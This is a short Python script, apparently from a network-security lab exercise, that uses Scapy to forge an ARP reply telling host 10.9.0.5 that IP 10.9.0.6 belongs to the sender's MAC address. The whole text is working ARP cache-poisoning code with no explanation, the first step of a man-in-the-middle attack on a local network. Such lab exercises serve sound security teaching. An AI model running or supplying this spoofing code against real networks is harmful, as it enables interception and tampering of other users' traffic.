from scapy.all import *
E = Ether()
E.dst = '02:42:0a:09:00:05'
E.src = '02:42:0a:09:00:69'
A = ARP()
A.hwsrc = '02:42:0a:09:00:69'
A.psrc = '10.9.0.6'
A.pdst = '10.9.0.5'
A.hwdst = '02:42:0a:09:00:05'
A.op = 2
pkt = E/A
sendp(pkt)